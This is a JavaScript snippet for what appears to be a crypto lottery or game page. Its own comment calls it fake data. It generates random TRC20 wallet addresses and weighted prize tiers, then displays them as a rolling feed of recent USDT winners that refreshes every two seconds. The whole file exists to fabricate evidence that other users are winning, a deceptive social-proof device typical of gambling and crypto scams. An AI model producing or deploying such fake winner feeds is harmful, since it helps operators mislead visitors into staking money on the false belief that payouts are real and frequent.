// ========== 滚动地址列表（假数据 · 只存档位，实时算金额） ==========
(function(){
  const QUEUE_SIZE = 20;
  const VISIBLE = 5;

  const WEIGHTED_POOL = [
    { match: 2, weight: 60 },
    { match: 3, weight: 25 },
    { match: 4, weight: 12 },
    { match: 5, weight: 3 }
  ];
  const TOTAL_WEIGHT = WEIGHTED_POOL.reduce((s, x) => s + x.weight, 0);

  function pickWeightedMatch() {
    let r = Math.random() * TOTAL_WEIGHT;
    for (const item of WEIGHTED_POOL) {
      if (r < item.weight) return item.match;
      r -= item.weight;
    }
    return 2;
  }

  function generateRandomTRC20() {
    const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    let addr = 'T';
    for (let i = 0; i < 33; i++) addr += chars.charAt(Math.floor(Math.random() * chars.length));
    return addr;
  }

  function generateRecord() {
    const winsCount = 1 + Math.floor(Math.random() * 3);
    const matches = [];
    for (let i = 0; i < winsCount; i++) matches.push(pickWeightedMatch());
    return { addr: generateRandomTRC20(), matches };
  }

  function calcTotal(rec) {
    const rewards = (window.__GAME_CONFIG && window.__GAME_CONFIG.rewards) || { 2: 10, 3: 30, 4: 200, 5: 10000 };
    let total = 0;
    for (const m of rec.matches) {
      total += parseFloat(rewards[m]) || 0;
    }
    return total;
  }

  const queue = [];

  function pushNew() {
    let rec = generateRecord();
    let attempts = 0;
    while (calcTotal(rec) <= 0 && attempts < 15) {
      rec = generateRecord();
      attempts++;
    }
    if (calcTotal(rec) <= 0) return;
    queue.push(rec);
    if (queue.length > QUEUE_SIZE) queue.shift();
  }

  function render() {
    const inner = document.getElementById('rollingInner');
    if (!inner) return;
    const cur = (window.__GAME_CONFIG && window.__GAME_CONFIG.currency) || 'USDT';
    if (queue.length === 0) {
      inner.innerHTML = `<div class="rolling-item"><span class="addr">—</span><span class="amt">0 ${cur}</span></div>`;
      return;
    }
    inner.innerHTML = queue.slice(0, VISIBLE).map(item => {
      const total = calcTotal(item);
      return `<div class="rolling-item"><span class="addr">${item.addr.slice(0,8)}...${item.addr.slice(-6)}</span><span class="amt">${formatAmountWithSep(total, cur)} ${cur}</span></div>`;
    }).join('');
  }

  function rebuild() {
    queue.length = 0;
    for (let i = 0; i < QUEUE_SIZE; i++) pushNew();
    render();
  }

  window.__rebuildRollingAddresses = rebuild;

  window.initRollingAddresses = function() {
    rebuild();
    setInterval(() => {
      queue.shift();
      pushNew();
      render();
    }, 2000);
  };
})();

function initRollingAddresses() {
  if (typeof window.initRollingAddresses === 'function') {
    window.initRollingAddresses();
  }
}
